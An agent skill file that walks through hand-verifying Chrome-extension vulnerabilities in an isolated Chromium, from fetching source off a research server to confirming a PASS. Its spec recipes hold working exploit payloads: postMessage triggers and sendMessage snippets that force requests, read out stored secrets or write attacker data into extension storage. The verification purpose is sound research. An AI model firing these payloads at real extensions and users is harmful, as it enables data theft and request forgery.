---
name: verify-extension
description: Manually verify a Chrome-extension vulnerability finding by reproducing it in a real browser. Use when asked to hand-verify, reproduce, or confirm extension findings (message-triggered request / data-exfiltration / storage-write vulns), or to check whether a "verified" finding is a true positive. Walks through fetching the extension source from the kuria server, loading it in an isolated Chromium, firing the attacker payload, and confirming the exploit by reading the mock server / page console / the extension's own chrome.storage.
---

# Manually verify a Chrome-extension vulnerability

Goal: prove a finding is a **real** vulnerability by reproducing it by hand in a real browser —
a web page sends a message and the extension does something it shouldn't (makes an
attacker-controlled request, hands its data back to the page, or writes attacker-controlled data
into its storage), with **no sender/origin check**. This is the ground-truth check behind the
automated verifier.

The scripts referenced below live in this skill's own directory (`patch_manifest.py`, `server.py`,
`verify.py`). Run them with their full path in this folder.

## 0. One-time setup (per machine)
```
python -m pip install playwright
python -m playwright install chromium
```
Use Playwright's **bundled Chromium**, not the system Chrome: `--load-extension` is ignored when a
launch routes into an already-running Chrome (single-instance), and MV2 support is gone from current
Chrome anyway. The scripts already do this.

## 1. Get the extension source from kuria
The extracted source lives at `/home/gobbi/experiment/CODE/<id>/` (crx at `.../DATASET/<id>.crx`).
Pick the finding IDs you want to verify, then:

**On kuria** (bundle them into one archive):
```
cd /home/gobbi/experiment/CODE && tar czhf ~/exts.tgz <id1> <id2> <id3> && ls -lh ~/exts.tgz
```
**From your local machine** (NOT inside the kuria session — run scp locally, pulling from kuria):
```
scp -P 54321 <user>@kuria.plai.ifi.lmu.de:~/exts.tgz /mnt/c/Users/<you>/Desktop/
```
**Then extract** (tar files come out read-only on Windows — fix perms):
```
mkdir exts && tar xzf exts.tgz -C exts && chmod -R u+w exts
```
Now the extensions are on this machine — hand them to Claude by telling it the folder
(e.g. `C:\Users\<you>\Desktop\exts`). If you're running this skill, just say "verify the ones in
that folder" and it takes over from here.

## 2. Patch each manifest
```
python <skill>/patch_manifest.py <exts>/<id>
```
Prints `id | MV<n> | SW=<bool> | own_key=<bool>`. **Note the id** — it's the pinned id
`nekdljaflldlhkhnmiflclddiepbehnf` unless the extension kept its own key. If it prints **MV2**, stop:
current Chromium won't load it; confirm that finding by source review instead.

## 3. Start the mock server (for request-category findings)
```
python <skill>/server.py <cwd>/_verify_server.log     # runs in background; logs Sec-Fetch-Site
```
`Sec-Fetch-Site: none` in the log = the request was made by the EXTENSION, not any page (the header
is browser-generated and unforgeable; a page fetch would read `cross-site`).

## 4. Trace the source to craft the payload (the real work)
Read the extension's own code to find: (a) the message channel it listens on, (b) the sink it feeds,
(c) that there is no sender/origin check. Minified code is fine — grep for the entry points:

- message intake: `onMessage`, `onMessageExternal`, `addEventListener("message"`, `addEventListener("<CustomEventName>"`
- sinks: `fetch(`, `XMLHttpRequest`, `WebSocket`, `chrome.tabs.create`  (request);
  `chrome.storage.*.get`, `chrome.cookies`, `localStorage.getItem`  (exfil);
  `chrome.storage.*.set`, `localStorage.setItem`  (storage)

Confirm the payload's message shape matches what the handler consumes and flows to the sink. Content
scripts often just **relay** page messages to the background, e.g.
`window.addEventListener("message", e => chrome.runtime.sendMessage(e.data))` — that relay is the bug.

## 5. Write a spec and run
Create a small `spec.json` (see recipes below), then:
```
python <skill>/verify.py <exts>/<id> spec.json --server-log <cwd>/_verify_server.log
```
It loads the extension alone, fires the payload from `https://example.com`, and prints
`PASS/FAIL | <category> | <evidence>`. A Chromium window opens briefly — you don't touch it.

### Category recipes (spec.json)

**request** — page message makes the extension fetch your URL:
```json
{"category":"request",
 "trigger":"window.postMessage({type:'FETCHING_SUMMARY', audio_url:'{SRV}'}, '*');"}
```

**iframe request** — extension exposes a frame page that fetches on postMessage:
```json
{"category":"iframe","iframe_page":"frame.html",
 "iframe_message":"{action:'PLUGILO_EXTENSION_REQUEST_IMAGE_BLOB_URL', url:MARKURL}"}
```

**2way request** — extension fetches and returns the response body to the page:
```json
{"category":"twoway","expect":"SERVER_SECRET_9182",
 "capture":"(async()=>{return await new Promise(r=>{const h=e=>{if(e.data&&e.data.type==='FROM_BACKGROUND_FETCHED'){window.removeEventListener('message',h);r(e.data.text);}};window.addEventListener('message',h);window.postMessage({type:'FROM_H5_FETCH',url:'{SRV}'},'*');setTimeout(()=>r('__timeout__'),6000);});})()"}
```

**exfil — self-contained roundtrip** (write via the vuln, read back via the vuln):
```json
{"category":"exfil","expect":"SECRET_{MARK}",
 "capture":"(async()=>{const send=m=>new Promise(r=>{chrome.runtime.sendMessage('{ID}',m,x=>r(chrome.runtime.lastError?('ERR:'+chrome.runtime.lastError.message):x));setTimeout(()=>r('__timeout__'),4000);});await send({code:'storageSet',payload:JSON.stringify({key:'exploit',value:'SECRET_{MARK}'})});const g=await send({code:'storageGet',payload:JSON.stringify({key:'exploit'})});try{return JSON.parse(g).responseBody;}catch(e){return JSON.stringify(g);}})()"}
```

**exfil — seed then read** (prove it returns a REAL secret it holds):
```json
{"category":"exfil","expect":"SECRET_{MARK}",
 "seed":[{"area":"local","key":"screenshot_exploit","value":"SECRET_{MARK}"}],
 "capture":"(async()=>{return await new Promise(r=>{chrome.runtime.sendMessage('{ID}',{type:'GET_SCREENSHOT',id:'exploit'},x=>r(chrome.runtime.lastError?('ERR:'+chrome.runtime.lastError.message):(x&&x.screenshot)));setTimeout(()=>r('__timeout__'),4000);});})()"}
```
Use `seed_localstorage` instead of `seed` when the handler reads page `localStorage`. Use `prime`
(a dummy `chrome.runtime.sendMessage('{ID}',...)`) to wake a lazy SW before seeding an external-only
extension.

**storage** — page message writes attacker data into the extension's storage:
```json
{"category":"storage",
 "trigger":"window.postMessage({jwt:'{MARK}'}, '*');"}
```
Add `"read_page":"index.html"` (any of the extension's own html pages) when it has NO service worker
and writes storage from its content script. If the handler coerces input (e.g. `parseInt(userId)`),
make `marker` a matching type: `{"marker":"918273645", ...}`.

## 6. Gotchas (each cost us a failed run once)
- **MV2 won't load** in current Chromium. Download an older Chrome-for-Testing that still supports
  it (e.g. 120: `https://storage.googleapis.com/chrome-for-testing-public/120.0.6099.109/win64/chrome-win64.zip`)
  and pass `--executable <chrome.exe>` to `verify.py` (it reads the MV2 background *page* for storage).
  If that's unavailable, verify by source review instead. `patch_manifest.py` prints `MV2` so you know.
- Content scripts inject only on a page load **after** the extension is enabled — the scripts handle
  this by loading the ext first, then navigating.
- **Loader content scripts** do `import(chrome.runtime.getURL(...))`; that module must be in
  `web_accessible_resources` for the test origin — `patch_manifest.py` sets WAR matches to `<all_urls>`,
  and `verify.py`'s iframe path needs the frame page web-accessible too.
- **Message sub-types are exact** — e.g. `AI.getAccessToken`, not `getAccessToken`.
- **Handlers may coerce input** (`parseInt`, JSON shape) — match the expected type, and note some read
  a JSON string token vs an object.
- **No service worker?** Read storage from one of the extension's own html pages (`read_page`).
- **Lazy/cold service worker** for `onMessageExternal`: retry / `prime` it; a first message can miss if
  the listener registers during SW startup.

## 7. Negative control (optional, strengthens the claim)
Load a trusted extension (or none) and fire the same payloads: expect **nothing** — no server hit, no
value returned, no storage write. Note honestly that a safe extension is inert mainly because it
lacks these handlers, not because it actively defends.

## 8. Report
State PASS/FAIL per extension with the evidence line (server `Sec-Fetch-Site: none`, the value
returned to the page, or the marker found in `chrome.storage`). A PASS = a page-controlled marker
reached somewhere it shouldn't, triggered only by a page message, with no origin check in the handler.
```
